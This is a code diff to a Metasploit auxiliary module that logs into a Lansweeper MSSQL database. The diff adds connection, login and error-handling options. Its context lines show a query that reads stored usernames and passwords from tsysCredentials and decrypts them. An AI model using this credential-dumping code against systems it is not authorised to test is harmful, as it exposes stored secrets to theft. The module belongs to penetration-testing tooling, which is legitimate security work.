@@ -2,9 +2,11 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+require 'metasploit/framework/mssql/client'
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::MSSQL
+  include Metasploit::Framework::MSSQL::Client
+
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -39,7 +41,13 @@ class MetasploitModule < Msf::Auxiliary
         ]))
 
     register_options([
-      OptString.new('DATABASE', [true, 'The Lansweeper database', 'lansweeperdb'])
+      OptString.new('DATABASE', [true, 'The Lansweeper database', 'lansweeperdb']),
+      Opt::RHOST,
+      Opt::RPORT(1433),
+      OptString.new('USERNAME', [ false, 'The username to authenticate as', 'sa']),
+      OptString.new('PASSWORD', [ false, 'The password for the specified username', '']),
+      OptBool.new('TDSENCRYPTION', [ true, 'Use TLS/SSL for TDS data "Force Encryption"', false]),
+      OptBool.new('USE_WINDOWS_AUTHENT', [ true, 'Use windows authentication (requires DOMAIN option set)', false]),
     ])
 
   end
@@ -136,10 +144,16 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    unless mssql_login_datastore
+    set_sane_defaults
+    unless mssql_login(datastore['USERNAME'], datastore['PASSWORD'])
       fail_with(Failure::NoAccess, 'Login failed. Check credentials.')
     end
     result = mssql_query("select Credname, Username, Password from #{datastore['DATABASE']}.dbo.tsysCredentials WHERE LEN(Password)>64", false)
+
+    if result[:errors]
+      print_error("SQL Query returned error: #{result[:errors].first}")
+      return
+    end
 
     result[:rows].each do |row|""
       pw = lsw_decrypt(row[2])
